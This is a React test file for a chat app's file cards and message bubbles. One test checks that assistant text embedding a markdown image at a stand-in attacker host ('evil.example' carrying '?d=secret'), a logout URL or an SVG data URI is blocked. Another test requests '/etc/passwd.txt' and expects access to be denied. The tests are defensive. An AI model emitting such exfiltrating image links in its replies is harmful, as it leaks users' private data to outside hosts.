import { render, screen, waitFor, fireEvent, within } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import type { RestClient } from '@hermes-pwa/core';
import { FileCards } from './FileCards';
import { MessageBubble } from './MessageBubble';
import type { RpcClient } from '@hermes-pwa/core';

function restWith(info: Partial<Record<string, unknown>> | Error): RestClient {
  return {
    localFileInfo: vi.fn(async () => {
      if (info instanceof Error) throw info;
      return { name: 'x', size: 2048, mime: 'application/pdf', inline: true, image: false, ...info };
    }),
  } as unknown as RestClient;
}

const rpcMock = { request: vi.fn(), events: new EventTarget() } as unknown as RpcClient;

describe('FileCards', () => {
  it('renders nothing without references', () => {
    const { container } = render(<FileCards refs={[]} />);
    expect(container.firstChild).toBeNull();
  });

  it('shows images inline through the plugin file route and opens them in place', () => {
    render(<FileCards refs={[{ path: '/Users/sean/Desktop/shot.png', name: 'shot.png', ext: 'png', kind: 'image' }]} />);
    const card = screen.getByTestId('file-image');
    const url = '/api/plugins/hermes-pwa/file?path=%2FUsers%2Fsean%2FDesktop%2Fshot.png';
    expect(screen.getByRole('img', { name: 'shot.png' })).toHaveAttribute('src', url);
    fireEvent.click(card);
    const lightbox = screen.getByTestId('lightbox');
    expect(lightbox).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /Save or share image/ })).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Close image' }));
    expect(screen.queryByTestId('lightbox')).toBeNull();
  });

  it('shows a file row with size and type from the info route', async () => {
    const rest = restWith({ size: 2048, mime: 'application/pdf' });
    render(<FileCards refs={[{ path: '/Users/sean/Desktop/labs.pdf', name: 'labs.pdf', ext: 'pdf', kind: 'file' }]} rest={rest} />);
    expect(screen.getByText('labs.pdf')).toBeInTheDocument();
    await waitFor(() => expect(screen.getByText('PDF, 2 KB')).toBeInTheDocument());
    expect(screen.getByTestId('file-row')).toHaveAttribute('data-href', '/api/plugins/hermes-pwa/file?path=%2FUsers%2Fsean%2FDesktop%2Flabs.pdf');
  });

  it('marks files the Mac cannot serve and removes the link', async () => {
    const missing = restWith(Object.assign(new Error('nope'), { status: 404 }));
    const { rerender } = render(
      <FileCards refs={[{ path: '/Users/sean/Desktop/gone.csv', name: 'gone.csv', ext: 'csv', kind: 'file' }]} rest={missing} />,
    );
    await waitFor(() => expect(screen.getByText('Not found on the Mac')).toBeInTheDocument());
    expect(screen.getByTestId('file-row').tagName).toBe('SPAN');

    const denied = restWith(Object.assign(new Error('nope'), { status: 403 }));
    rerender(<FileCards refs={[{ path: '/etc/passwd.txt', name: 'passwd.txt', ext: 'txt', kind: 'file' }]} rest={denied} />);
    await waitFor(() => expect(screen.getByText('Outside the shared folders')).toBeInTheDocument());
  });

  it('falls back to a file row when an image fails to load', () => {
    render(<FileCards refs={[{ path: '/Users/sean/Desktop/broken.png', name: 'broken.png', ext: 'png', kind: 'image' }]} />);
    fireEvent.error(screen.getByRole('img', { name: 'broken.png' }));
    expect(screen.getByTestId('file-row')).toBeInTheDocument();
  });
});

describe('MessageBubble file handling', () => {
  it('shows assistant-mentioned files as cards under the text', () => {
    render(
      <MessageBubble
        rpc={rpcMock}
        message={{
          id: '1',
          role: 'assistant',
          text: 'Saved the screenshot to /Users/sean/.hermes/cache/images/shot.png and the data to /Users/sean/Desktop/data.csv',
          createdAt: undefined,
        }}
      />,
    );
    expect(screen.getByTestId('file-image')).toBeInTheDocument();
    expect(screen.getByText('data.csv')).toBeInTheDocument();
  });

  it('does not show cards while the assistant is still streaming', () => {
    render(
      <MessageBubble
        rpc={rpcMock}
        streaming
        isLast
        message={{ id: '1', role: 'assistant', text: 'Writing to /Users/sean/Desktop/out.png', createdAt: undefined }}
      />,
    );
    expect(screen.queryByTestId('file-cards')).toBeNull();
  });

  it('strips @file lines from the user bubble and shows them as attachments', () => {
    render(
      <MessageBubble
        rpc={rpcMock}
        message={{
          id: '2',
          role: 'user',
          text: 'What is in this photo?\n\n@file:/Users/sean/.hermes/attachments/photo.jpg',
          createdAt: undefined,
        }}
      />,
    );
    expect(screen.getByText('What is in this photo?')).toBeInTheDocument();
    expect(screen.queryByText(/@file:/)).toBeNull();
    expect(screen.getByTestId('file-image')).toBeInTheDocument();
  });

  it('renders fenced code with a language label and a copy button', () => {
    render(
      <MessageBubble
        rpc={rpcMock}
        message={{ id: '3', role: 'assistant', text: 'Run this:\n\n```python\nprint("hi")\n```', createdAt: undefined }}
      />,
    );
    const block = screen.getByTestId('code-block');
    expect(block).toHaveAttribute('data-language', 'python');
    expect(screen.getByText('Python')).toBeInTheDocument();
    expect(within(block).getByRole('button', { name: /Copy/ })).toBeInTheDocument();
    expect(block.querySelector('code.language-python')).not.toBeNull();
  });

  it('renders GFM tables and strikethrough', () => {
    render(
      <MessageBubble
        rpc={rpcMock}
        message={{ id: '4', role: 'assistant', text: '| a | b |\n| - | - |\n| 1 | 2 |\n\n~~old~~', createdAt: undefined }}
      />,
    );
    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getByText('old').tagName).toBe('DEL');
  });
});

describe('markdown image policy', () => {
  it('renders same-origin images and blocks external ones', async () => {
    const { render, screen } = await import('@testing-library/react');
    const { MessageBubble } = await import('./MessageBubble');
    const rpc = { request: () => Promise.resolve(), events: new EventTarget() } as unknown as import('@hermes-pwa/core').RpcClient;
    render(
      <MessageBubble
        rpc={rpc}
        message={{
          id: 'img',
          role: 'assistant',
          text: '![local](/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png)\n\n![leak](https://evil.example/x.png?d=secret)\n\n![logout](/auth/logout)\n\n![svg](data:image/svg+xml;base64,PHN2Zy8+)',
          createdAt: undefined,
        }}
      />,
    );
    const imgs = screen.getAllByRole('img');
    expect(imgs.map((i) => i.getAttribute('src'))).toEqual(['/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png']);
    expect(screen.getByText('leak')).toHaveClass('hm-message__blocked-image');
    expect(screen.getByText('logout')).toHaveClass('hm-message__blocked-image');
    expect(screen.getByText('svg')).toHaveClass('hm-message__blocked-image');
  });
});
